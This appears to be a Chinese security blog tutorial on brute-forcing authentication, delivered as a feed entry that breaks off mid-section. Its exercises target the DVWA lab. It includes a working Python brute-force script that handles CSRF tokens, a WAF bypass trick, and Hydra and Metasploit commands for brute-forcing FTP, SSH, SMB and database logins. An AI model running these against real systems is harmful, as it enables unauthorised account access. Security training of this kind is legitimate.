    <content type="html"><![CDATA[<h1 id="认证技术"><a href="#认证技术" class="headerlink" title="认证技术"></a>认证技术</h1><p>身份认证技术是用于在计算机网络中<strong>确认操作者身份</strong>的一种有效的解决方法。 计算机网络世界中一切信息包括用户的身份信息都是用一组特定的数据来表示的，计算机只能识别用户的数字身份，所有<strong>对用户的授权</strong>也是针对<strong>用户数字身份的授权</strong>。身份认证攻击就是为了使用各种办法通过这层认证，突破作为防护网络资产的第一道关口，身份认证攻击在渗透测试中有着举足轻重的作用。</p><p>对于身份认证攻击可以直接进行爆破攻击，在配置不当的情况下内网中还会经常遇到非授权访问。</p><h1 id="Web认证爆破"><a href="#Web认证爆破" class="headerlink" title="Web认证爆破"></a>Web认证爆破</h1><h2 id="DWVA-靶场搭建"><a href="#DWVA-靶场搭建" class="headerlink" title="DWVA 靶场搭建"></a>DWVA 靶场搭建</h2><p>官方网站:<br><a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">http://www.dvwa.co.uk/</a></p><p>项目地址:<br><a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a></p><p>DVWA 是一个入门的 Web 安全学习靶场。这里直接去 Dokcer Hub 搜索一个容器来部署安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 拉取镜像</span><br><span class="line">docker pull sqreen/dvwa</span><br><span class="line"></span><br><span class="line"># 部署安装</span><br><span class="line">docker run -d -t -p 8888:80 sqreen/dvwa</span><br></pre></td></tr></table></figure><p>然后本地浏览器访问 <a href="http://127.0.0.1:8888" target="_blank" rel="noopener">http://127.0.0.1:8888</a>，我们首先需要初始化一下 DVWA，相关的版本信息如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># MySQL root 用户密码为空</span><br><span class="line">$ mysql -e &quot;select version(),user()&quot;</span><br><span class="line">+---------------------------+----------------+</span><br><span class="line">| version()                 | user()         |</span><br><span class="line">+---------------------------+----------------+</span><br><span class="line">| 10.3.22-MariaDB-0+deb10u1 | root@localhost |</span><br><span class="line">+---------------------------+----------------+</span><br><span class="line"></span><br><span class="line"># PHP 7.3.14 版本</span><br><span class="line">$ php -v</span><br><span class="line">PHP 7.3.14-1~deb10u1 (cli) (built: Feb 16 2020 15:07:23) ( NTS )</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.3.14, Copyright (c) 1998-2018 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.3.14-1~deb10u1, Copyright (c) 1999-2018, by Zend Technologies</span><br><span class="line"></span><br><span class="line"># Apache 版本为 2.4.38</span><br><span class="line">$ apache2 -v</span><br><span class="line">Server version: Apache/2.4.38 (Debian)</span><br><span class="line">Server built:   2019-10-15T19:53:42</span><br><span class="line"></span><br><span class="line"># 内核版本</span><br><span class="line">$ uname -a</span><br><span class="line">Linux 57bb72d1c052 4.19.76-linuxkit #1 SMP Fri Apr 3 15:53:26 UTC 2020 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure><p>在 Web 安全领域暴力破解是一个基础技能，不仅需要好的字典，还需要具有灵活编写脚本的能力。</p><h2 id="DVWA-基础爆破"><a href="#DVWA-基础爆破" class="headerlink" title="DVWA 基础爆破"></a>DVWA 基础爆破</h2><ul><li>Low<ul><li>GET 登录不够安全，一般使用 POST 方式进行登录</li><li>用户名和密码都没有进行过滤</li></ul></li><li>Medium<ul><li>这个 Medium 级别的源码登录逻辑并没有啥变化，只是登录失败的时候会延时 2 秒，这样爆破的速度会慢一些，不过依然可以进行传统的暴力破解。</li></ul></li></ul><h2 id="CTFHub-Basic-基础认证爆破"><a href="#CTFHub-Basic-基础认证爆破" class="headerlink" title="CTFHub Basic 基础认证爆破"></a>CTFHub Basic 基础认证爆破</h2><p>官网：<a href="https://www.ctfhub.com/" target="_blank" rel="noopener">https://www.ctfhub.com/</a></p><p>「CTFHub技能树」—「Web前置技能」—「HTTP协议」—「基础认证」：</p><h2 id="四位纯数字爆破"><a href="#四位纯数字爆破" class="headerlink" title="四位纯数字爆破"></a>四位纯数字爆破</h2><p>简单编写一个代码用来练习数字爆破：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'pass'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'flag&#123;xxxxxxx&#125;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'pass is error &lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hint: isset(\$_REQUEST['pass'])"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="四种常见的-POST-提交数据方式"><a href="#四种常见的-POST-提交数据方式" class="headerlink" title="四种常见的 POST 提交数据方式"></a>四种常见的 POST 提交数据方式</h2><p>顺便提一下 四种常见的 POST 提交数据方式：</p><h3 id="application-x-www-form-urlencoded"><a href="#application-x-www-form-urlencoded" class="headerlink" title="application/x-www-form-urlencoded"></a>application/x-www-form-urlencoded</h3><p>最常见的 POST 提交数据的方式了。浏览器的原生<code>&lt;form&gt;</code>表单，请求类似于下面这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST http://www.example.com HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded;charset=utf-8</span><br><span class="line"></span><br><span class="line">title=test&amp;sub%5B%5D=1&amp;sub%5B%5D=2&amp;sub%5B%5D=3</span><br></pre></td></tr></table></figure><h3 id="multipart-form-data"><a href="#multipart-form-data" class="headerlink" title="multipart/form-data"></a>multipart/form-data</h3><p>另一个常见的 POST 数据提交的方式,这种方式一般用来上传文件，各大服务端语言对它也有着良好的支持。一个请求示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST http://www.example.com HTTP/1.1</span><br><span class="line">Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;text&quot;</span><br><span class="line"></span><br><span class="line">title</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;chrome.png&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">PNG ... content of chrome.png ...</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span><br></pre></td></tr></table></figure><p>首先生成了一个 boundary 用于分割不同的字段，为了避免与正文内容重复，boundary 很长很复杂。</p><p>然后 Content-Type 里指明了数据是以 multipart/form-data 来编码，本次请求的 boundary 是什么内容。</p><p>消息主体里按照字段个数又分为多个结构类似的部分，每部分都是以 –boundary 开始，紧接着是内容描述信息，然后是回车，最后是字段具体内容（文本或二进制）。</p><p>如果传输的是文件，还要包含文件名和文件类型信息。消息主体最后以 –boundary– 标示结束。</p><p>表单演示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>multipart/form-data 测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/php/brute.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"pass"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="application-json"><a href="#application-json" class="headerlink" title="application/json"></a>application/json</h3><p>在越来越多的人把它作为请求头，用来告诉服务端消息主体是序列化后的 JSON 字符串。</p><p>由于 JSON 规范的流行，除了低版本 IE 之外的各大浏览器都原生支持，服务端语言也都有处理 JSON 的函数，使用 JSON 不会遇上什么麻烦:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST http://www.example.com HTTP/1.1</span><br><span class="line">Content-Type: application/json;charset=utf-8</span><br><span class="line"></span><br><span class="line">&#123;&quot;title&quot;:&quot;test&quot;,&quot;sub&quot;:[1,2,3]&#125;</span><br></pre></td></tr></table></figure><h3 id="text-xml"><a href="#text-xml" class="headerlink" title="text/xml"></a>text/xml</h3><p>一种使用 HTTP 作为传输协议，XML 作为编码方式的远程调用规范。典型的 XML-RPC 请求是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST http://www.example.com HTTP/1.1</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">    &lt;methodName&gt;examples.getStateName&lt;/methodName&gt;</span><br><span class="line">    &lt;params&gt;</span><br><span class="line">        &lt;param&gt;</span><br><span class="line">            &lt;value&gt;&lt;i4&gt;41&lt;/i4&gt;&lt;/value&gt;</span><br><span class="line">        &lt;/param&gt;</span><br><span class="line">    &lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure><p>早期安全狗也曾出现过 WAF 缺陷，因为匹配过于严谨，一个空格导致安全狗被绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 原内容：</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------471463142114</span><br><span class="line"># 修改后 boundary后面加入空格。</span><br><span class="line">Content-Type: multipart/form-data; boundary =---------------------------471463142114</span><br></pre></td></tr></table></figure><h2 id="带验证码爆破"><a href="#带验证码爆破" class="headerlink" title="带验证码爆破"></a>带验证码爆破</h2><p>实验环境：<a href="http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php</a></p><p>工具：Pkav HTTP Fuzzer</p><p>Python 生成一个 3 位数的字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'dic.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">for</span> z <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                f.write(<span class="string">f'<span class="subst">&#123;x&#125;</span><span class="subst">&#123;y&#125;</span><span class="subst">&#123;z&#125;</span>\n'</span>)</span><br></pre></td></tr></table></figure><p>使用 Pkav 的 HTTP Fuzz 测试工具进行爆破即可。</p><h2 id="DVWA-High-带-Token-爆破"><a href="#DVWA-High-带-Token-爆破" class="headerlink" title="DVWA - High 带 Token 爆破"></a>DVWA - High 带 Token 爆破</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检测用户的 token</span></span><br><span class="line">checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// 过滤用户名和密码</span></span><br><span class="line">$user = $checkToken_GET[ <span class="string">'username'</span> ];</span><br><span class="line">$user = stripslashes( $user );</span><br><span class="line">$user = mysql_real_escape_string( $user );</span><br><span class="line">$pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">$pass = stripslashes( $pass );</span><br><span class="line">$pass = mysql_real_escape_string( $pass );</span><br><span class="line">$pass = md5( $pass );</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据匹配</span></span><br><span class="line">$query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">$result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( $result &amp;&amp; mysql_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">  登录成功</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">  登录失败</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关增加了 token 的检测，从如下代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br></pre></td></tr></table></figure><p>Token 的值来源于 index.php，访问 index.php 查看源码信息，找到如下 token 的位置:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> DVWA_WEB_PAGE_TO_ROOT . <span class="string">'dvwa/includes/dvwaPage.inc.php'</span>;</span><br></pre></td></tr></table></figure><p>追踪 dvwaPage.inc.php 找到 token 相关函数的定义：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkToken</span><span class="params">( $user_token, $session_token, $returnURL )</span> </span>&#123;  <span class="comment"># 校验 token</span></span><br><span class="line">    <span class="keyword">if</span>( $user_token !== $session_token || !<span class="keyword">isset</span>( $session_token ) ) &#123;</span><br><span class="line">        dvwaMessagePush( <span class="string">'CSRF token is incorrect'</span> );</span><br><span class="line">        dvwaRedirect( $returnURL );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateSessionToken</span><span class="params">()</span> </span>&#123;  <span class="comment"># 当前时间的 md5 值作为 token</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION[ <span class="string">'session_token'</span> ] ) ) &#123;</span><br><span class="line">        destroySessionToken();</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[ <span class="string">'session_token'</span> ] = md5( uniqid() );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">destroySessionToken</span><span class="params">()</span> </span>&#123;  <span class="comment"># 销毁 token</span></span><br><span class="line">    <span class="keyword">unset</span>( $_SESSION[ <span class="string">'session_token'</span> ] );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tokenField</span><span class="params">()</span> </span>&#123;  <span class="comment"># 将 token 输出到 input 框中</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"&lt;input type='hidden' name='user_token' value='&#123;$_SESSION[ 'session_token' ]&#125;' /&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后登陆的数据包如下:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /vulnerabilities/brute/index.php?username=admin&amp;password=password&amp;Login=Login&amp;user_token=&#123;token&#125; HTTP/1.1</span><br></pre></td></tr></table></figure><p>需要在 user_token 的后面跟上之前从源码中获取到的 token 值，这是一个登陆的完整流程，下面使用 Python 脚本进行爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(headers)</span>:</span></span><br><span class="line">    index_url = <span class="string">'http://127.0.0.1:8888/vulnerabilities/brute/index.php'</span></span><br><span class="line">    index_html = requests.get(url=index_url, headers=headers, timeout=<span class="number">3</span>).text</span><br><span class="line">    token_pattern = re.compile(<span class="string">r"name='user_token' value='(.*?)'"</span>)</span><br><span class="line">    token = token_pattern.findall(index_html)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_with_token</span><span class="params">(uname, passwd, headers)</span>:</span></span><br><span class="line">    token = get_token(headers)</span><br><span class="line">    brute_url = <span class="string">f'http://127.0.0.1:8888/vulnerabilities/brute/index.php?username=<span class="subst">&#123;uname&#125;</span>&amp;password=<span class="subst">&#123;passwd&#125;</span>&amp;Login=Login&amp;user_token=<span class="subst">&#123;token&#125;</span>'</span></span><br><span class="line">    r = requests.get(url=brute_url, headers=headers)</span><br><span class="line">    print(<span class="string">f'<span class="subst">&#123;token&#125;</span>:<span class="subst">&#123;uname&#125;</span>:<span class="subst">&#123;passwd&#125;</span>'</span>, end=<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'hackable'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(<span class="string">'\nBingo 爆破成功'</span>)</span><br><span class="line">        print(<span class="string">f'username:<span class="subst">&#123;uname&#125;</span> \npassword:<span class="subst">&#123;passwd&#125;</span>\n'</span>)</span><br><span class="line">        os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Host'</span>: <span class="string">'127.0.0.1:8888'</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>: <span class="string">'csrftoken=zeS7KCvlVoiNMuxtdrjF77dC88sqib2J2nYf4alfeDwKeaSaEMDA5wFIH9yf8kyz; PHPSESSID=bqfflff6be4tgg69lfnv4g4ik4; security=high'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    username = sys.argv[<span class="number">1</span>]</span><br><span class="line">    password_path = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(password_path, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            lines = <span class="string">''</span>.join(f.readlines()).split(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> password <span class="keyword">in</span> lines:</span><br><span class="line">            brute_with_token(username, password, headers)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'文件读取异常'</span>)</span><br></pre></td></tr></table></figure><p>脚本使用方法和效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python brute.py admin pass.txt</span><br><span class="line"></span><br><span class="line">7e43d35b6c656afdf926a95a55d6252e:admin:Pass999</span><br><span class="line">...</span><br><span class="line">f6f9db1ba43dfd57288fb73159503652:admin:password</span><br><span class="line"></span><br><span class="line">Bingo 爆破成功</span><br><span class="line">username:admin</span><br><span class="line">password:password</span><br></pre></td></tr></table></figure><h1 id="系统认证爆破"><a href="#系统认证爆破" class="headerlink" title="系统认证爆破"></a>系统认证爆破</h1><p>国内常见弱口令：</p><p><img src="http://qiniuyun.lintstar.top/image-20200728141811750.png" alt="image-20200728141811750"></p><h2 id="爆破工具"><a href="#爆破工具" class="headerlink" title="爆破工具"></a>爆破工具</h2><p><img src="http://qiniuyun.lintstar.top/20200802163842.png" alt="20200802163842"></p><h2 id="Hydra-九头蛇"><a href="#Hydra-九头蛇" class="headerlink" title="Hydra 九头蛇"></a>Hydra 九头蛇</h2><p><strong><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">https://github.com/vanhauser-thc/thc-hydra</a></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># FTP爆破</span><br><span class="line">hydra -L /root/user.txt -P /root/password.txt ftp://192.168.0.1 -vV</span><br><span class="line"></span><br><span class="line"># SSH 爆破</span><br><span class="line">hydra -L /root/user.txt -P /root/password.txt ssh://192.168.0.1 --vV</span><br><span class="line"></span><br><span class="line"># SMB 爆破</span><br><span class="line">hydra -l admin -P password.txt smb://10.211.55.9</span><br><span class="line"></span><br><span class="line"># MSSQL 爆破</span><br><span class="line">hydra -L /root/user.txt -P /root/password.txt 192.168.0.1 mssql -vV</span><br><span class="line"></span><br><span class="line"># MySQL 爆破</span><br><span class="line">hydra -L /root/user.txt -P /root/password.txt 192.168.0.1 mysql -vV</span><br></pre></td></tr></table></figure><h2 id="SNETCracker"><a href="#SNETCracker" class="headerlink" title="SNETCracker"></a>SNETCracker</h2><p><a href="https://github.com/shack2/SNETCracker" target="_blank" rel="noopener">https://github.com/shack2/SNETCracker</a></p><p>超级弱口令检查工具是一款Windows平台的弱口令审计工具，支持批量多线程检查。</p><blockquote><p>SSH登录发生异常！Could not load file or assembly ‘ChilkatDotNet4.dll’ or one of its dependencies. 找不到指定的模块。</p></blockquote><p>这个错误是因为需要这个ssh模块需要vc++2010 32位得支持，下载安装就行了。RDP 错误一般是线程过多，一般建议最好在 10 个以内，自己慢慢试，线程多了就会出问题。</p><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></p><p>RAPID7 团队出品。Offensive Security 团队</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set rhosts 10.20.xx.xxx</span><br><span class="line">set username admin</span><br><span class="line">set pass_file /Users/sec/Documents/Sec/hydra/password.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="常见爆破思路"><a href="#常见爆破思路" class="headerlink" title="常见爆破思路"></a>常见爆破思路</h2><h3 id="爆破-21-FTP"><a href="#爆破-21-FTP" class="headerlink" title="爆破 21 FTP"></a>爆破 21 FTP</h3><p>FTP（File Transfer Protocol，文件传输协议） 是TCP/IP 协议组中的协议之一。</p><p>hydra 指令：</p><p><code>hydra -L user.txt -P password.txt ftp://127.0.0.1</code></p><p>msf 模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ftp/ftp_login</span><br></pre></td></tr></table></figure><h3 id="爆破-22-SSH"><a href="#爆破-22-SSH" class="headerlink" title="爆破 22 SSH"></a>爆破 22 SSH</h3><p>SSH 为 Secure Shell 的缩写，是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。默认端口为 22</p><p>爆破前检测是否开启数据库外连，不要做无意义的爆破。</p><blockquote><p>SSH 爆破 判断对方是否开启公私钥</p></blockquote><p>hydra 指令<br><code>hydra -L user.txt -P password.txt ssh://127.0.0.1</code></p><p>msf 模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ssh/ssh_login</span><br></pre></td></tr></table></figure><h3 id="爆破-23-Telnet"><a href="#爆破-23-Telnet" class="headerlink" title="爆破 23 Telnet"></a>爆破 23 Telnet</h3><p>Telnet 协议是 Internet 远程登录服务的标准协议和主要方式。</p><p>msf 模块：</p><figure class="highlight 